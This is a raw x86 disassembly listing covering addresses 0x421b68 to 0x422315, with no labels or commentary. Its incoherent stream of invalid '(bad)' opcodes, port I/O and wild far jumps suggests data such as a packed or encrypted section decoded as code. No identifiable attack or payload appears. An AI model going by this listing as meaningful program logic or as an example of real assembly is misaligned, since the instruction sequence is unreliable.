  421b68:	mov    cl,0x7e
  421b6a:	in     eax,0x9b
  421b6c:	mov    ah,0x5b
  421b6e:	jl     0x421bcc
  421b70:	cmp    ah,BYTE PTR [edx+0x1a]
  421b73:	jmp    0xa281a07
  421b78:	mov    DWORD PTR [edx-0x5160dd07],edi
  421b7e:	scas   al,BYTE PTR es:[edi]
  421b7f:	cli    
  421b80:	inc    ebp
  421b81:	fwait
  421b82:	pop    es
  421b83:	add    BYTE PTR [edx],al
  421b85:	stc    
  421b86:	push   eax
  421b87:	mov    dl,0x2e
  421b89:	cmp    DWORD PTR [ecx+0x5f],eax
  421b8c:	js     0x421b5b
  421b8e:	fdivr  DWORD PTR [ebp-0x450a03eb]
  421b94:	push   ebx
  421b95:	lea    esp,[ecx]
  421b97:	push   esp
  421b98:	(bad)  
  421b99:	sub    BYTE PTR [ebx-0x76d78f2e],dh
  421b9f:	and    esp,DWORD PTR ds:0x799360f7
  421ba5:	jl     0x421b65
  421ba7:	imul   esp,DWORD PTR [edi-0x1ef7890d],0xffffffc6
  421bae:	xchg   ebp,eax
  421baf:	sbb    ecx,esi
  421bb1:	test   al,0xe0
  421bb3:	cmc    
  421bb4:	add    BYTE PTR [eax-0x1c13841e],ch
  421bba:	(bad)  
  421bbb:	(bad)  
  421bbc:	xor    WORD PTR [ebx+0xe753f8d],cx
  421bc3:	push   cs
  421bc4:	ja     0x421ba6
  421bc6:	data16 sub bh,BYTE PTR [edi+0x27]
  421bca:	jo     0x421bd9
  421bcc:	popf   
  421bcd:	cld    
  421bce:	outs   dx,BYTE PTR ds:[esi]
  421bcf:	fistp  WORD PTR [esi*4-0x759e2bb8]
  421bd6:	pushf  
  421bd7:	fcom   DWORD PTR [esi]
  421bd9:	add    eax,DWORD PTR [esi-0x7e]
  421bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bdd:	fsub   DWORD PTR [esp+edi*1]
  421be0:	add    esp,edi
  421be2:	jnp    0x421b8f
  421be4:	sub    ebp,ebx
  421be6:	push   edi
  421be7:	mov    ebx,0xe88e5e2b
  421bec:	inc    ebx
  421bed:	mov    esp,0x8478dbd4
  421bf2:	cld    
  421bf3:	sub    BYTE PTR [edi-0x1d],dl
  421bf6:	mov    al,BYTE PTR [ecx-0x6a]
  421bf9:	add    DWORD PTR [edx+0x17],esi
  421bfc:	xor    BYTE PTR [esi+0x57],bh
  421bff:	ins    BYTE PTR es:[edi],dx
  421c00:	loopne 0x421c53
  421c02:	stos   BYTE PTR es:[edi],al
  421c03:	sbb    BYTE PTR es:[esp+esi*8-0x6f],0x8a
  421c09:	test   BYTE PTR [ecx-0x2a],dl
  421c0c:	inc    esp
  421c0d:	ds std 
  421c0f:	sbb    al,0x35
  421c11:	pop    ds
  421c12:	cmp    BYTE PTR [ecx+0xe],0xf
  421c16:	mov    ds:0xd62c8e31,eax
  421c1b:	popf   
  421c1c:	xchg   esi,eax
  421c1d:	in     al,dx
  421c1e:	cmp    esp,DWORD PTR [edx]
  421c20:	fnstenv [ebx+0x35]
  421c23:	sub    dl,BYTE PTR [edx+0x19e2cf75]
  421c29:	mov    ecx,0x52841545
  421c2e:	adc    esp,DWORD PTR [esi]
  421c30:	shl    BYTE PTR [eax],cl
  421c32:	test   DWORD PTR [edx+0xd761d1e],eax
  421c38:	sbb    DWORD PTR [eax+0x14b931f3],0xffffffc4
  421c3f:	inc    eax
  421c40:	dec    ebx
  421c41:	loopne 0x421c8e
  421c43:	popf   
  421c44:	xchg   esi,eax
  421c45:	and    bl,bl
  421c47:	fcomp  QWORD PTR [eax+0x79]
  421c4a:	icebp  
  421c4b:	test   al,0x88
  421c4d:	adc    al,0xd2
  421c4f:	sbb    eax,0x38b60b80
  421c54:	mov    eax,0x828fa402
  421c59:	inc    ebx
  421c5a:	xor    DWORD PTR [edi],0xd3254d2f
  421c60:	ret    
  421c61:	push   edx
  421c62:	push   edx
  421c63:	adc    BYTE PTR [eax+0x39e6a233],bh
  421c69:	push   es
  421c6a:	mov    ah,0x1d
  421c6c:	jmp    0xa67a:0xf8a1db02
  421c73:	adc    DWORD PTR [eax],eax
  421c75:	fidiv  WORD PTR [eax+0x5a]
  421c78:	js     0x421c84
  421c7a:	shl    BYTE PTR [edi+0x77],0x9c
  421c7e:	or     DWORD PTR [edx],ebx
  421c80:	add    DWORD PTR [ebx+edx*1],esi
  421c83:	mov    edi,0x2b1f7f6a
  421c88:	cmp    DWORD PTR [eax],edi
  421c8a:	mov    al,0x6b
  421c8c:	xor    al,0x10
  421c8e:	xor    DWORD PTR [edi-0x7bedef99],esp
  421c94:	fstp   QWORD PTR [ecx-0x5d6d84a0]
  421c9a:	add    DWORD PTR [eax],0x53
  421c9d:	mov    ah,0xc0
  421c9f:	out    dx,eax
  421ca0:	outs   dx,DWORD PTR ds:[esi]
  421ca1:	sahf   
  421ca2:	inc    esi
  421ca3:	xchg   edx,eax
  421ca4:	mov    ebp,0xfc24cdbd
  421ca9:	mov    edx,0x8ec8e54f
  421cae:	loope  0x421cda
  421cb0:	mov    dl,0x65
  421cb2:	es mov ch,0xb4
  421cb5:	cmp    eax,0xacde57b0
  421cba:	and    bl,BYTE PTR [ebx]
  421cbc:	ret    0x321f
  421cbf:	or     eax,0xaa3e575d
  421cc4:	sbb    al,0xc4
  421cc6:	ficom  DWORD PTR [edi-0x5e04b5f1]
  421ccc:	cmp    cl,bh
  421cce:	mov    al,BYTE PTR [eax-0x7b]
  421cd1:	lahf   
  421cd2:	push   ss
  421cd3:	jmp    0x2bb1b339
  421cd8:	outs   dx,DWORD PTR ds:[esi]
  421cd9:	fwait
  421cda:	out    dx,eax
  421cdb:	das    
  421cdc:	outs   dx,DWORD PTR ds:[esi]
  421cdd:	jmp    0x6a0cb49f
  421ce2:	xor    eax,0x8d41e1fa
  421ce7:	out    dx,eax
  421ce8:	fwait
  421ce9:	push   ebp
  421cea:	sbb    ebp,DWORD PTR [ecx+0x77]
  421ced:	or     al,0x66
  421cef:	mov    ch,0xde
  421cf1:	lods   al,BYTE PTR ds:[esi]
  421cf2:	test   BYTE PTR [edi+ebp*4],ah
  421cf5:	and    dh,BYTE PTR cs:[eax-0x72]
  421cf9:	pop    ebx
  421cfa:	xchg   esp,eax
  421cfb:	sub    DWORD PTR [edi+0xa],ecx
  421cfe:	cmp    al,0x0
  421d00:	test   ch,0xb2
  421d03:	and    eax,DWORD PTR [esi-0x30]
  421d06:	or     eax,0x56ac6948
  421d0b:	shl    BYTE PTR [eax],0xd
  421d0e:	sbb    BYTE PTR [ebp+0x3644dae4],ch
  421d14:	lods   eax,DWORD PTR ds:[esi]
  421d15:	imul   esi,DWORD PTR [ecx+0xa],0x4dd3e2d4
  421d1c:	hlt    
  421d1d:	push   edi
  421d1e:	inc    eax
  421d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d20:	pop    ss
  421d21:	std    
  421d22:	or     BYTE PTR [esi+0x1d],al
  421d25:	xchg   DWORD PTR [ebp+0x1c1600ec],esp
  421d2b:	cli    
  421d2c:	out    0x7b,al
  421d2e:	outs   dx,DWORD PTR ds:[esi]
  421d2f:	sub    ch,BYTE PTR [ecx-0x14]
  421d32:	pop    ebx
  421d33:	jle    0x421d3b
  421d35:	rcr    esi,0x52
  421d38:	test   eax,0xdf79f76d
  421d3d:	popa   
  421d3e:	cmc    
  421d3f:	(bad)  
  421d40:	in     al,dx
  421d41:	add    edx,ebp
  421d43:	xchg   edi,eax
  421d44:	ror    DWORD PTR [ebx-0x7a],1
  421d47:	jmp    0xb9eb8594
  421d4c:	shl    DWORD PTR [edx+0xf66e934],0x61
  421d53:	pop    edi
  421d54:	mov    ?,esp
  421d56:	out    0xa0,al
  421d58:	dec    eax
  421d59:	mov    ebx,0x29bd4b80
  421d5e:	arpl   WORD PTR [ebp-0x416266ec],di
  421d64:	lock int 0x74
  421d67:	fwait
  421d68:	out    0xd9,eax
  421d6a:	sbb    esp,DWORD PTR [edi]
  421d6c:	pusha  
  421d6d:	pop    edx
  421d6e:	cld    
  421d6f:	sub    ebx,ebx
  421d71:	mov    edx,0x4435e835
  421d76:	test   cl,al
  421d78:	(bad)
  421d7d:	push   ebx
  421d7e:	retf   
  421d7f:	push   ebx
  421d80:	sbb    ah,BYTE PTR [ebx+0x1d]
  421d83:	int    0x5b
  421d85:	sub    al,0x44
  421d87:	push   edi
  421d88:	pop    ebp
  421d89:	sti    
  421d8a:	jb     0x421de9
  421d8c:	fucom  st(7)
  421d8f:	imul   edx,DWORD PTR [edx-0x1a4faf8a],0x2
  421d96:	adc    ah,ah
  421d98:	mov    bl,0xa6
  421d9a:	mov    ebp,0x17e3eb3b
  421d9f:	int3   
  421da0:	repnz or dh,BYTE PTR [esp+ecx*8+0x13]
  421da5:	add    ch,bh
  421da7:	mov    esi,0x19cad0ba
  421dac:	jno    0x421e00
  421dae:	xor    eax,0xe12bb1da
  421db3:	es (bad) 
  421db5:	imul   edi,DWORD PTR [esi+ebx*1],0xffffffcf
  421db9:	loope  0x421d3b
  421dbb:	es call 0x118e:0x36d7cac2
  421dc3:	addr16 dec ebp
  421dc5:	dec    edx
  421dc6:	daa    
  421dc7:	mov    bl,0xa4
  421dc9:	pop    esp
  421dca:	sbb    bh,BYTE PTR [edi]
  421dcc:	mov    DWORD PTR [ebx],ebx
  421dce:	pop    esi
  421dcf:	prefetch BYTE PTR [edx-0x5c]
  421dd3:	adc    ch,al
  421dd5:	and    BYTE PTR [ebp-0x71],bl
  421dd8:	xor    eax,0xe7ad719d
  421ddd:	push   edi
  421dde:	cdq    
  421ddf:	gs stos BYTE PTR es:[edi],al
  421de1:	adc    DWORD PTR [esp+edi*1-0x25],edi
  421de5:	rcr    DWORD PTR [esi-0x63189c79],1
  421deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dec:	and    BYTE PTR [ebp+0x70dfec7c],dl
  421df2:	dec    ecx
  421df3:	pop    es
  421df4:	xchg   ebx,eax
  421df5:	sbb    ch,BYTE PTR [edx+esi*8+0x3f]
  421df9:	std    
  421dfa:	pop    ebx
  421dfb:	adc    DWORD PTR [edx+0x3d],eax
  421dfe:	cmp    cl,bh
  421e00:	aad    0xd4
  421e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e03:	popa   
  421e04:	cmp    al,0xa9
  421e06:	fimul  WORD PTR [edi]
  421e08:	push   edx
  421e09:	dec    ebx
  421e0a:	push   eax
  421e0b:	xchg   ebx,eax
  421e0c:	xchg   edi,eax
  421e0d:	inc    edi
  421e0e:	mov    esi,0x96369d1
  421e13:	int3   
  421e14:	fcomip st,st(6)
  421e16:	out    0x8b,eax
  421e18:	xor    eax,DWORD PTR [edi+0x34]
  421e1b:	mov    esi,0x4896ad47
  421e20:	mov    dl,0xfe
  421e22:	mov    al,0xb5
  421e24:	pop    edx
  421e25:	mov    ebp,0xbd3488b3
  421e2a:	(bad)  [esi]
  421e2c:	add    DWORD PTR [edi-0x51],ecx
  421e2f:	xor    al,0xb8
  421e31:	inc    edi
  421e32:	and    eax,0xb4cb386
  421e37:	xor    al,0x59
  421e3a:	jns    0x421dc1
  421e3c:	push   ebx
  421e3d:	jbe    0x421df8
  421e3f:	dec    ebx
  421e40:	dec    ebp
  421e41:	xchg   edi,eax
  421e42:	in     al,dx
  421e43:	arpl   bx,dx
  421e45:	repnz rcr BYTE PTR [edi+edx*2-0x774527e2],cl
  421e4d:	mov    dh,BYTE PTR [eax+0xd]
  421e50:	les    eax,FWORD PTR [edx+0x72]
  421e53:	imul   ebp,ebx,0x854d4d8
  421e59:	dec    edx
  421e5a:	int    0x7b
  421e5c:	rcr    DWORD PTR [esi],0xfa
  421e5f:	sti    
  421e60:	push   ds
  421e61:	xor    ebp,esi
  421e63:	or     al,0xb9
  421e65:	test   al,0x6b
  421e67:	mov    dl,BYTE PTR [ebx-0x55]
  421e6a:	in     eax,0x52
  421e6c:	push   esi
  421e6d:	mov    esi,0x36c1abd8
  421e72:	xor    al,ch
  421e74:	and    al,0x7a
  421e76:	aaa    
  421e77:	enter  0x164d,0x9d
  421e7b:	jae    0x421ed5
  421e7d:	or     BYTE PTR [esi+0x71],0x55
  421e81:	push   ebx
  421e82:	pop    esp
  421e83:	sub    edi,DWORD PTR [eax+0x7a]
  421e86:	pop    eax
  421e87:	push   esp
  421e88:	sbb    eax,0xc3b75eee
  421e8d:	pop    ecx
  421e8e:	jae    0x421e93
  421e90:	(bad)  
  421e91:	sub    edi,DWORD PTR [edi+ecx*8]
  421e94:	shl    DWORD PTR [ecx-0x30cebd06],cl
  421e9a:	lods   al,BYTE PTR ds:[esi]
  421e9b:	mov    al,0x62
  421e9d:	push   es
  421e9e:	scas   eax,DWORD PTR es:[edi]
  421e9f:	in     al,dx
  421ea0:	and    eax,0x34b3d05d
  421ea5:	call   0x5651:0xd06bd429
  421eac:	xchg   DWORD PTR [eax-0x1c23765d],esi
  421eb2:	add    BYTE PTR [edx+0x4e],0x5
  421eb6:	arpl   WORD PTR [esi+eax*2+0x10],si
  421eba:	dec    edi
  421ebb:	fwait
  421ebc:	not    BYTE PTR [ebx-0x24]
  421ebf:	dec    ebx
  421ec0:	lods   eax,DWORD PTR ds:[esi]
  421ec1:	jns    0x421f27
  421ec3:	mov    esp,edx
  421ec5:	stc    
  421ec6:	call   0x62e7a726
  421ecb:	int    0xf4
  421ecd:	out    dx,al
  421ece:	and    al,0xb1
  421ed0:	mov    bl,cl
  421ed2:	hlt    
  421ed3:	and    bl,ch
  421ed5:	dec    eax
  421ed6:	push   eax
  421ed7:	sub    eax,0xc34fdacb
  421edc:	xor    eax,0xdb84765c
  421ee1:	xor    al,BYTE PTR ss:[edi+0x3678a9e5]
  421ee8:	cmc    
  421ee9:	popf   
  421eea:	bound  ebp,QWORD PTR ds:0xe324dfaa
  421ef0:	data16 ds loop 0x421f29
  421ef4:	pop    ss
  421ef5:	add    DWORD PTR [esi],esi
  421ef7:	test   eax,0x884b90fb
  421efc:	jo     0x421ecc
  421efe:	xor    DWORD PTR [esi+0x27],edx
  421f01:	cmp    al,0xe1
  421f03:	cmp    bh,ch
  421f05:	cld    
  421f06:	sti    
  421f07:	adc    edi,DWORD PTR [edx+0x55]
  421f0a:	jne    0x421f2b
  421f0c:	cmc    
  421f0d:	jbe    0x421f55
  421f0f:	mov    DWORD PTR [edi-0x73],ebx
  421f12:	stc    
  421f13:	je     0x421f50
  421f15:	hlt    
  421f16:	loop   0x421ec2
  421f18:	scas   eax,DWORD PTR es:[edi]
  421f19:	lods   eax,DWORD PTR ds:[esi]
  421f1a:	mov    edx,0xf2b0aecb
  421f1f:	xor    al,0x38
  421f21:	fsubp  st(7),st
  421f23:	retf   
  421f24:	jmp    0x605:0x801c4aca
  421f2b:	push   cs
  421f2c:	sbb    DWORD PTR [edx],0x17
  421f2f:	xchg   esi,eax
  421f30:	addr16 add ebx,ebp
  421f33:	sbb    al,0x4c
  421f35:	retf   
  421f36:	leave  
  421f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f38:	and    eax,0x3408619
  421f3d:	add    ecx,ebx
  421f3f:	dec    ebx
  421f40:	lds    ecx,FWORD PTR [edi-0x1d]
  421f43:	lahf   
  421f44:	(bad)  
  421f45:	inc    esi
  421f46:	adc    BYTE PTR es:[ebx-0x49363c2e],bh
  421f4d:	jle    0x421f6a
  421f4f:	mov    bl,0x81
  421f51:	(bad)  
  421f52:	fcmove st,st(3)
  421f54:	mov    dh,0x7d
  421f56:	sbb    BYTE PTR [ecx+edx*2-0x3],al
  421f5a:	mov    bl,BYTE PTR [edi-0x80]
  421f5d:	lock mov edi,DWORD PTR [eax+eax*1+0x6fa6945c]
  421f65:	sbb    dh,dl
  421f67:	sbb    al,0x89
  421f69:	jecxz  0x421f79
  421f6b:	pop    edx
  421f6c:	pop    edx
  421f6d:	pop    ebx
  421f6e:	loop   0x421f2f
  421f70:	(bad)  
  421f71:	imul   ebx,DWORD PTR [edi+0x2190f88],0xffffffad
  421f78:	retf   0x74e1
  421f7b:	clc    
  421f7c:	shr    DWORD PTR [ecx+0x18],1
  421f7f:	rcl    BYTE PTR [esi-0x33],1
  421f82:	dec    eax
  421f83:	xchg   edx,eax
  421f84:	jno    0x421f91
  421f86:	dec    esi
  421f87:	sub    ecx,DWORD PTR [ebx-0x61f12a14]
  421f8d:	cmp    eax,0x3719ccb1
  421f92:	jmp    0xddad5c3a
  421f97:	js     0x421fc9
  421f99:	mov    WORD PTR [ecx-0x71],gs
  421f9c:	aam    0xe8
  421f9e:	nop
  421f9f:	mov    al,ds:0xe404b99d
  421fa4:	mov    ds:0x9524cb76,al
  421fa9:	les    esi,FWORD PTR [edx-0x25]
  421fac:	or     al,0x9b
  421fae:	cmp    cl,BYTE PTR [ebx-0x57147be7]
  421fb4:	les    esi,FWORD PTR [edx]
  421fb6:	dec    edi
  421fb7:	push   edx
  421fb8:	loope  0x421fec
  421fba:	or     cl,BYTE PTR [ecx-0x9]
  421fbd:	retf   
  421fbe:	rcr    BYTE PTR [ecx+0x53288827],cl
  421fc4:	sbb    DWORD PTR [ecx+0x5],esp
  421fc7:	bound  ebx,QWORD PTR [edx-0x6021015a]
  421fcd:	ins    BYTE PTR es:[edi],dx
  421fce:	lock pop edx
  421fd0:	mov    WORD PTR [ebp+ebx*1+0xdcd53cb],fs
  421fd7:	mov    cl,0xc3
  421fd9:	dec    ebx
  421fda:	sti    
  421fdb:	push   cs
  421fdc:	pop    es
  421fdd:	xchg   edi,eax
  421fde:	out    0xd0,al
  421fe0:	imul   eax,DWORD PTR [esi-0x70],0xebfc7d2d
  421fe7:	dec    ebx
  421fe8:	cmc    
  421fe9:	out    0xdd,eax
  421feb:	mov    ebx,0x88d67326
  421ff0:	pop    ds
  421ff1:	mov    dh,0x63
  421ff3:	jae    0x421fdc
  421ff5:	neg    BYTE PTR [ecx]
  421ff7:	pop    ebp
  421ff8:	and    eax,0xa6c3dd3
  421ffd:	cmp    BYTE PTR [ecx+0x5d],bl
  422000:	cmp    dl,BYTE PTR [ecx]
  422002:	adc    esi,DWORD PTR [edi-0x38977719]
  422008:	stc    
  422009:	repz push 0xfffffff3
  42200c:	pusha  
  42200d:	mov    ds:0xa92b1547,al
  422012:	pop    edx
  422013:	or     eax,ecx
  422015:	fld    DWORD PTR [esi]
  422017:	mov    edx,0x213e7fad
  42201c:	and    edx,DWORD PTR [esi]
  42201e:	pop    ebp
  42201f:	push   ebx
  422020:	pushf  
  422021:	cld    
  422022:	sti    
  422023:	or     eax,0x926b4c5e
  422028:	jmp    0xcc1ef47a
  42202d:	cmp    eax,0xb10e42dd
  422032:	sbb    DWORD PTR [esi],ebp
  422034:	cmp    eax,0x80a470bd
  422039:	sti    
  42203a:	cmp    eax,0x58d31903
  42203f:	fdiv   DWORD PTR [ecx+0x2678df6d]
  422045:	popa   
  422046:	mov    ebx,0x547ff75a
  42204b:	ins    DWORD PTR es:[edi],dx
  42204c:	xchg   edx,eax
  42204d:	mov    edi,0x706f7a15
  422052:	and    al,0x55
  422054:	xchg   ebx,eax
  422055:	mul    DWORD PTR [ecx-0x5ea78f45]
  42205b:	sub    al,0x32
  42205d:	jmp    0xf764b0eb
  422062:	hlt    
  422063:	xchg   edi,eax
  422064:	iret   
  422065:	add    BYTE PTR [eax],bh
  422067:	mov    eax,ds:0x612c8804
  42206c:	inc    edi
  42206d:	adc    DWORD PTR [edx+0x52],ebp
  422070:	(bad)  
  422071:	xchg   ecx,eax
  422072:	fs sbb al,0x24
  422075:	ret    
  422076:	loopne 0x422007
  422078:	in     al,dx
  422079:	les    esp,FWORD PTR [edi+0x33f3a4c2]
  42207f:	ret    0xf24b
  422082:	shr    DWORD PTR [eax+ebx*4+0x244839b7],0xae
  42208a:	mov    edx,0xff8574f
  42208f:	lods   eax,DWORD PTR ds:[esi]
  422090:	pusha  
  422091:	loopne 0x4220b6
  422093:	loope  0x422074
  422095:	stc    
  422096:	loope  0x422038
  422098:	aas    
  422099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42209a:	cmp    eax,eax
  42209c:	fisttp WORD PTR [esi+0x15a10e36]
  4220a2:	dec    ebp
  4220a3:	scas   al,BYTE PTR es:[edi]
  4220a4:	xchg   ebx,eax
  4220a5:	xchg   BYTE PTR [ecx+0x36029a09],dl
  4220ab:	scas   eax,DWORD PTR es:[edi]
  4220ac:	aaa    
  4220ad:	or     dh,BYTE PTR [ecx]
  4220af:	shl    BYTE PTR [eax+0x10],1
  4220b2:	ds je  0x42203b
  4220b5:	cmp    ah,cl
  4220b7:	inc    esi
  4220b8:	jns    0x4220f2
  4220ba:	sbb    eax,0xcdfde4fe
  4220bf:	dec    eax
  4220c0:	add    ah,BYTE PTR [esi+0x617a6cc3]
  4220c6:	inc    eax
  4220c7:	scas   al,BYTE PTR es:[edi]
  4220c8:	fnsave [ebx-0x14e62817]
  4220ce:	mov    WORD PTR [ebp+0x716b1069],cs
  4220d4:	jge    0x422073
  4220d6:	test   DWORD PTR [ecx-0x62],edx
  4220d9:	out    0x8e,al
  4220db:	mov    BYTE PTR [ebx],bh
  4220dd:	mov    eax,ds:0x86ff2c8f
  4220e2:	cmp    eax,0xf63e69d7
  4220e7:	push   0xa3976b05
  4220ec:	jmp    0xd0568720
  4220f1:	into   
  4220f2:	idiv   BYTE PTR [eax+0x39ea780b]
  4220f8:	sbb    dh,0x36
  4220fb:	pop    edi
  4220fc:	xor    eax,DWORD PTR [esi]
  4220fe:	ficomp DWORD PTR [edi+0x3b]
  422101:	adc    al,0xcd
  422103:	inc    esp
  422104:	rcl    DWORD PTR [ecx-0x545b251b],0x97
  42210b:	loopne 0x422095
  42210d:	call   0x5a25:0xcdf9372a
  422114:	gs test al,0x5
  422117:	xor    edx,DWORD PTR [eax-0x6f]
  42211a:	les    edi,FWORD PTR [edi]
  42211c:	aas    
  42211d:	daa    
  42211e:	ror    DWORD PTR [edx],cl
  422120:	push   edx
  422121:	popf   
  422122:	mov    edi,ebx
  422124:	push   ds
  422125:	gs arpl sp,sp
  422128:	push   0xffffff9d
  42212a:	xlat   BYTE PTR ds:[ebx]
  42212b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42212c:	in     al,dx
  42212d:	push   ebp
  42212e:	loopne 0x42216a
  422130:	jae    0x422163
  422132:	sbb    al,0xd2
  422134:	jp     0x422145
  422136:	jns    0x422143
  422138:	mov    esi,DWORD PTR [ecx+0x61]
  42213b:	push   edx
  42213c:	ret    0xe4b2
  42213f:	enter  0x467a,0x62
  422143:	and    DWORD PTR [ebx-0x7b],esi
  422146:	inc    esi
  422147:	inc    esp
  422148:	sub    edx,DWORD PTR [ecx-0x16]
  42214b:	pop    ebx
  42214c:	ins    DWORD PTR es:[edi],dx
  42214d:	in     eax,dx
  42214e:	retf   0x8fb1
  422151:	dec    esp
  422152:	je     0x422167
  422154:	aaa    
  422155:	jecxz  0x42219c
  422157:	sub    eax,0xb497986e
  42215c:	push   ds
  42215d:	rcl    esp,0xd3
  422160:	cmp    dl,BYTE PTR [eax+ecx*8+0x75]
  422164:	cld    
  422165:	xor    eax,0x63a2e2b1
  42216a:	sub    bh,dh
  42216c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42216d:	push   esp
  42216e:	repnz xor al,0x9b
  422171:	push   ebp
  422172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422173:	and    BYTE PTR [edi+0x5c],ah
  422176:	pop    esp
  422177:	mov    dl,0x2b
  422179:	cmp    al,0x5a
  42217b:	mov    bh,0x1c
  42217d:	imul   ebp,ecx,0x2f364334
  422183:	mov    eax,ds:0xf8874e6e
  422188:	scas   eax,DWORD PTR es:[edi]
  422189:	lahf   
  42218a:	test   BYTE PTR [ecx-0x7a],bl
  42218d:	mov    dl,0x1
  42218f:	iret   
  422190:	sti    
  422191:	addr16 jbe 0x42215b
  422194:	(bad)  
  422195:	sub    al,0xcd
  422197:	jg     0x4221a4
  422199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42219a:	fcomp  st(2)
  42219c:	sbb    eax,0xe44810e3
  4221a1:	outs   dx,BYTE PTR ds:[esi]
  4221a2:	aas    
  4221a3:	mov    al,ds:0xe30d435b
  4221a8:	lds    ebx,FWORD PTR [edi]
  4221aa:	xor    al,0x71
  4221ac:	and    eax,0xf1762c52
  4221b1:	test   BYTE PTR [eax+0xcb75615],bl
  4221b7:	xor    eax,DWORD PTR [edi]
  4221b9:	jnp    0x422182
  4221bb:	stos   DWORD PTR es:[edi],eax
  4221bc:	daa    
  4221bd:	imul   ebp,DWORD PTR [ecx+0x8c1bba9],0xffffff9f
  4221c4:	lahf   
  4221c5:	mov    ecx,0x9aede83
  4221ca:	cld    
  4221cb:	pop    ecx
  4221cc:	retf   0x6f3a
  4221cf:	pop    eax
  4221d0:	xchg   edx,eax
  4221d1:	in     eax,dx
  4221d2:	icebp  
  4221d3:	rol    DWORD PTR [esi+edx*4],0x12
  4221d7:	cmp    al,0x68
  4221d9:	pop    edx
  4221da:	scas   al,BYTE PTR es:[edi]
  4221db:	in     al,dx
  4221dc:	enter  0x7da4,0xda
  4221e0:	clc    
  4221e1:	pop    ss
  4221e2:	sar    BYTE PTR [ebx+ecx*2],cl
  4221e5:	data16 jecxz 0x422238
  4221e8:	ins    DWORD PTR es:[edi],dx
  4221e9:	xchg   ebp,eax
  4221ea:	push   0xf
  4221ec:	xchg   esi,eax
  4221ed:	data16 or BYTE PTR [ecx+0x2267879d],0x83
  4221f5:	jo     0x4221c7
  4221f7:	outs   dx,BYTE PTR ds:[esi]
  4221f8:	scas   al,BYTE PTR es:[edi]
  4221f9:	xor    BYTE PTR [edi],al
  4221fb:	popa   
  4221fc:	jmp    0x4221b3
  4221fe:	aam    0x75
  422200:	int3   
  422201:	out    0x9f,eax
  422203:	bound  eax,QWORD PTR [ecx+0x5c2fd757]
  422209:	push   edi
  42220a:	pop    ebx
  42220b:	mov    ah,0x68
  42220d:	ret    0x54c5
  422210:	push   ecx
  422211:	push   esi
  422212:	leave  
  422213:	mov    edx,0x1e095933
  422218:	pop    ds
  422219:	mov    ds:0xa1785d40,eax
  42221e:	pop    ebp
  42221f:	loope  0x4221a2
  422221:	in     al,dx
  422222:	test   BYTE PTR [ebp-0x19],0xd7
  422226:	cli    
  422227:	mov    ebx,0xdd554c96
  42222c:	mov    esi,DWORD PTR [ecx-0x6d]
  42222f:	xchg   BYTE PTR [edx],dl
  422231:	jno    0x4221b9
  422233:	(bad)
  422236:	je     0x4221d5
  422238:	ins    BYTE PTR es:[edi],dx
  422239:	shl    DWORD PTR [ebp+ebx*8-0xfe5b702],cl
  422240:	jle    0x42222d
  422242:	or     bh,BYTE PTR [eax]
  422244:	sub    ebp,DWORD PTR [esi+esi*8+0x20467a36]
  42224b:	add    eax,0x402a720a
  422250:	fisub  DWORD PTR [ebp-0x480f5fff]
  422256:	mov    bh,0x21
  422258:	test   bh,al
  42225a:	mov    bl,0x85
  42225c:	cmp    DWORD PTR [esi+esi*4+0x72],edx
  422260:	mov    ah,0x2a
  422262:	adc    DWORD PTR [edi-0x1b],ecx
  422265:	adc    dh,bh
  422267:	sub    cl,BYTE PTR [ebx-0x1]
  42226a:	popf   
  42226b:	in     eax,dx
  42226c:	popa   
  42226d:	xor    dh,cl
  42226f:	cmp    DWORD PTR gs:[ecx],ecx
  422272:	cwde   
  422273:	(bad)  
  422274:	cmp    ebp,DWORD PTR [edi]
  422276:	les    edx,FWORD PTR [esi-0xa]
  422279:	mov    al,0x9b
  42227b:	out    0x11,al
  42227d:	inc    eax
  42227e:	sbb    DWORD PTR [ebx+0x69],edx
  422281:	sub    eax,0x84b17c4b
  422286:	dec    eax
  422287:	inc    esp
  422288:	iret   
  422289:	bound  esp,QWORD PTR [edi]
  42228b:	adc    dl,BYTE PTR [ebx+0x6a]
  42228e:	add    eax,0x2fc374a0
  422293:	add    esp,DWORD PTR [esi+edi*8-0x22]
  422297:	ins    BYTE PTR es:[edi],dx
  422298:	shl    DWORD PTR [esi+0x23e3c086],1
  42229e:	in     eax,dx
  42229f:	div    BYTE PTR [edi-0x8]
  4222a2:	mov    edi,0x7c1ca98b
  4222a7:	retf   0x5337
  4222aa:	lea    ecx,[ebp+eax*2-0x13]
  4222ae:	aaa    
  4222af:	sbb    ch,BYTE PTR [ebx-0x7baa701f]
  4222b5:	dec    eax
  4222b6:	ja     0x422307
  4222b8:	lea    ecx,[edi]
  4222ba:	popa   
  4222bb:	mov    dl,0x68
  4222bd:	jnp    0x4222c3
  4222bf:	jmp    0x422322
  4222c1:	pop    eax
  4222c2:	jne    0x42230c
  4222c4:	and    eax,0xf9f7e66
  4222c9:	adc    DWORD PTR [ecx+ebx*4-0x15ee9463],esp
  4222d0:	sbb    dh,dl
  4222d2:	xchg   ebp,eax
  4222d3:	sub    eax,0x55986e3e
  4222d8:	and    edx,edx
  4222da:	xor    BYTE PTR [edi+0x33],ch
  4222dd:	push   esi
  4222de:	sbb    al,0x74
  4222e0:	jmp    0x4182:0x4032c266
  4222e7:	fbld   TBYTE PTR [edi-0x6ff2b014]
  4222ed:	pop    ebx
  4222ee:	dec    eax
  4222ef:	mov    al,0xca
  4222f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222f2:	pop    ebp
  4222f3:	call   0xe374:0x63d5c2e0
  4222fa:	(bad)  
  4222fb:	mov    ds:0xca07b70f,eax
  422300:	pop    ss
  422301:	call   0xd1cff311
  422306:	data16 jl 0x42231f
  422309:	cmp    al,0x1d
  42230b:	add    al,0x82
  42230d:	pmullw mm3,QWORD PTR [ebx-0x604decb6]
  422314:	cwde   
  422315:	push   0x65af2d1a
